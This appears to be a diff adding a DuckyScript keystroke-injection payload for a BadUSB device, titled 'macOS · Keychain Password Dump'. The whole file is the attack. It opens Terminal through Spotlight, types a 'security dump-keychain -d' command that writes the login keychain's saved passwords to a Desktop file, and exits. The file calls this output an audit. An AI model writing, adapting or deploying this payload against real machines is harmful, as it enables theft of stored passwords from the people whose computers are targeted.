@@ -1,0 +1,20 @@
+REM ============================================================
+REM  macOS · Keychain Password Dump
+REM ============================================================
+REM  Uses the security command to list all saved passwords in
+REM  the user's login keychain. Each entry will prompt for the
+REM  keychain password (or Touch ID on newer Macs).
+REM
+REM  Output: ~/Desktop/keychain_audit.txt
+
+DEFAULTDELAY 80
+
+GUI SPACE
+DELAY 500
+STRING terminal
+DELAY 400
+ENTER
+DELAY 1500
+STRINGLN security dump-keychain -d login.keychain-db > ~/Desktop/keychain_audit.txt 2>&1
+DELAY 2000
+STRINGLN exit
